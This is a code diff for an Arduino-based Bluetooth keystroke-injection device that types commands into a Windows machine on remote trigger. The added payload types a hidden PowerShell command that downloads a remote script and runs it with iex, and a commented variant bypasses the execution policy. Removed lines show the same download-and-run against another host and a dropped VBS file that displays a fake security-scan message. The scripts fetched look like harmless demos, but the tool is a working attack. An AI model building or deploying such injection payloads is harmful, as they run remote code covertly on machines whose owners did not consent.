@@ -1,6 +1,7 @@
-void returnRelease(){
-  Keyboard.press(KEY_RETURN);
+void winKey(){
+  Keyboard.press(KEY_LEFT_GUI);
   Keyboard.releaseAll();
+  delay(100);
 }
 
 void runBox(){
@@ -11,15 +12,12 @@ void runBox(){
 }
 
 void openCmd(){
-  runBox();
-  Keyboard.print("cmd");
-  returnRelease();
+  winKey();
+  Keyboard.println("cmd");
   delay(100);
 }
 void openCmdAsAdmin(){
-  Keyboard.press(KEY_LEFT_GUI);
-  Keyboard.releaseAll();
-  delay(200);
+  winKey();
   Keyboard.print("cmd");
   delay(300);
   Keyboard.press(KEY_LEFT_CTRL);
@@ -36,42 +34,15 @@ void openCmdAsAdmin(){
 
 
 void payload() {
-  runBox();
-  Keyboard.print("iexplore.exe https://www.youtube.com/watch?v=5j-sY41ru4M");
-  returnRelease();
+  winKey();
+  //Keyboard.println("powershell.exe -windowstyle hidden -NoProfile -ExecutionPolicy Bypass -Command \"iex ((New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/robertbarrett/bluetooth-hid/master/helloworld.ps1'))\"");
+  Keyboard.println("powershell.exe -windowstyle hidden -NoProfile -Command \"iex ((New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/robertbarrett/bluetooth-hid/master/helloworld.ps1'))\"");
 }
 
 void payload2() {
-  runBox();
-  Keyboard.print("cmd");
-  returnRelease();
-  delay(100);
-  Keyboard.print("copy con /Y %appdata%\\nokia.vbs");
-  returnRelease();
-  Keyboard.print("Set wshShell = CreateObject( \"WScript.Shell\" )");
-  Keyboard.press(KEY_RETURN);
-  Keyboard.print("WScript.Echo wshShell.ExpandEnvironmentStrings( \"Hello \" + \"%USERNAME%\" + \". An urgent security scan is underway. Please do not click OK\")");
-  returnRelease();
-  Keyboard.press(KEY_LEFT_CTRL);
-  Keyboard.press('c');
-  Keyboard.releaseAll();
-  Keyboard.print("exit");
-  returnRelease();
-  runBox();
-  Keyboard.print("wscript.exe %appdata%\\nokia.vbs");
-  returnRelease();
+  winKey();
+  Keyboard.println("iexplore.exe https://www.youtube.com/watch?v=5j-sY41ru4M");
 }
-void payload3(){
-  runBox();
-  Keyboard.print("wscript.exe %appdata%\\nokia.vbs");
-  returnRelease();
-}
-void payload4(){
-  runBox();
-  Keyboard.print("powershell.exe -windowstyle hidden -NoProfile -ExecutionPolicy Bypass -Command \"iex ((New-Object System.Net.WebClient).DownloadString('http://robertbarrett.com/files/helloworld.ps1'))\"");
-  returnRelease();
-}
-
 
 void setup() {
   Serial3.begin (9600);
@@ -88,16 +59,6 @@ void loop() {
     else if(btRead == '2'){
        payload2();
        Serial3.print("\r\nPayload 2 sent\r\n");
-    }
-    else if(btRead == '3'){
-       payload3();
-       Serial3.print("\r\nPayload 3 sent\r\n");
-    }
-    else if(btRead == '4'){
-       payload4();
-       Serial3.print("\r\nPayload 4 sent\r\n");
-    }
-    else if(btRead == '5'){
     }
 
     
